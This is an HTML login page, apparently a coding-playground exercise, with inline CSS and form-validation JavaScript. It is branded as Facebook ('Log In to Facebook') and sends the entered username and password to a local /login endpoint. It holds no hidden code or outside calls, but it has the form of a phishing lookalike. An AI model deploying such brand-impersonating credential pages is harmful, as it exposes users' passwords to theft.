<!doctype html>
<html lang="en"> 
 <head> 
  <meta charset="UTF-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  <title>Login</title> 
  <link rel="stylesheet" href="/styles.css"> 
 <style type="text/css" id="dcoder_stylesheet">/* Reset and Box Sizing */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

/* Body Styling */
body {
    font-family: Arial, sans-serif;
    background-color: #f0f2f5;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

/* Login Container */
.login-container {
    background-color: #ffffff;
    padding: 40px;
    border-radius: 8px;
    box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
    width: 350px;
    text-align: center;
}

/* Facebook Logo Styling */
.facebook-logo {
    font-size: 40px;
    font-family: 'Helvetica', sans-serif;
    color: #1877f2;
    margin-bottom: 20px;
    font-weight: bold;
    letter-spacing: -1px;
}

/* Header */
h2 {
    font-size: 24px;
    margin-bottom: 20px;
    color: #333;
}

/* Input Group */
.input-group {
    margin-bottom: 15px;
    text-align: left;
}

/* Labels */
label {
    font-size: 14px;
    color: #333;
}

/* Inputs */
input {
    width: 100%;
    padding: 10px;
    margin-top: 5px;
    border: 1px solid #ccc;
    border-radius: 5px;
    font-size: 14px;
}

/* Input Focus */
input:focus {
    outline: none;
    border-color: #4b97d1;
}

/* Login Button */
button {
    width: 100%;
    padding: 10px;
    background-color: #4b97d1;
    color: white;
    border: none;
    border-radius: 5px;
    font-size: 16px;
    cursor: pointer;
}

/* Button Hover */
button:hover {
    background-color: #3b7db1;
}

/* Media Queries for Responsiveness */
@media (max-width: 400px) {
    .login-container {
        width: 90%;
        padding: 20px;
    }
}</style></head> 
 <body> 
  <div class="login-container"> 
   <div class="facebook-logo">
    Facebook
   </div> <!-- Updated here --> 
   <h2>Log In to Facebook</h2> 
   <form id="loginForm" action="/login" method="POST"> 
    <div class="input-group"> <label for="username">Username</label> 
     <input type="text" id="username" name="username" required placeholder="Enter your username"> 
    </div> 
    <div class="input-group"> <label for="password">Password</label> 
     <input type="password" id="password" name="password" required placeholder="Enter your password"> 
    </div> <button type="submit" class="login-btn">Log In</button> 
   </form> 
  </div> 
  <script src="/scripts.js"></script> 
 
<script type="text/javascript" id="dcoder_script">// Wait for the DOM to load
document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById("loginForm");

    form.addEventListener("submit", (e) => {
        e.preventDefault(); // Prevent form submission to handle validation first

        const username = document.getElementById("username").value.trim();
        const password = document.getElementById("password").value.trim();

        // Validation
        if (!username || !password) {
            alert("Please fill in both fields.");
            return;
        }

        // Example of additional validation (optional)
        if (username.length < 3) {
            alert("Username must be at least 3 characters long.");
            return;
        }

        if (password.length < 6) {
            alert("Password must be at least 6 characters long.");
            return;
        }

        // Success message
        alert(`Logging in as: ${username}`);

        // Submit the form (optional, based on your requirements)
        form.submit();
    });
});</script></body></html>
